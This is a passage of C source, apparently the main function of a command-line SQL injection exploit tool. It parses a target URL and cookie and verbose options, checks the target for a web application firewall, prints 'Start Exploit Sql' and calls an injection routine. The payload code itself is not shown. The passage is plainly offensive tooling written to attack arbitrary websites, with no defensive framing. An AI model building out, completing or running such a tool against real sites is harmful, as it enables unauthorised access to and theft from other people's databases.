        OPT_BOOLEAN('v',
                    "verbose",
                    &verbose,
                    "Verbose Mode"),
        OPT_END(),
    };
    struct argparse argparse;
    argparse_init(&argparse,
                  options,
                  NULL,
                  0);

    argparse_parse(&argparse,
                   argc,
                   argv);
    if (!yourUrl)
    {
        printf("\e[1;31m[-] Please Enter Your Url !\e[0m\n");
        printf("\e[1;31m[-] Ex : ./exploit -u http://URL\\e[0mn");
        printf("\e[1;31m[-] Exit Syscall\e[0m\n");
        exitAssembly();
    }
    checkWaf(yourUrl);
    printf("---------------------------------------------------------------------\e[0m\n\n");
    printf("[+] Start Exploit Sql...\e[0m\n");
    if (cookies)
    {
        selecetCookie = 1;
    }
    if (verbose)
    {
        verbose = 1;
    }
    injection(yourUrl);
    return 0;
}